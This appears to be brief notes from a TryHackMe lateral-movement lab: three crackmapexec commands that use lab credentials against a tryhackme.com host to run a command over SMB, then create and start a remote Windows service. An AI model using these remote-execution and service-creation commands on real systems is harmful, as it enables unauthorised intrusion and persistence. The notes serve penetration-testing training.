Example of executing a command remotely...

```cmd
crackmapexec smb -u t1_leonard.summers -p EZpass4ever -x "pwd" thmiis.za.tryhackme.com
```

Create a service remotely through crackmapexec
```cmd
crackmapexec smb -u t1_leonard.summers -p EZpass4ever -x 'sc.exe create THMservice-n3rd binPath= "%windir%\myService1.exe" start= auto' thmiis.za.tryhackme.com
```

Start the service remotely through crackmapexec
```cmd
crackmapexec smb -u t1_leonard.summers -p EZpass4ever -x 'sc.exe start THMservice-n3rd' thmiis.za.tryhackme.com
```


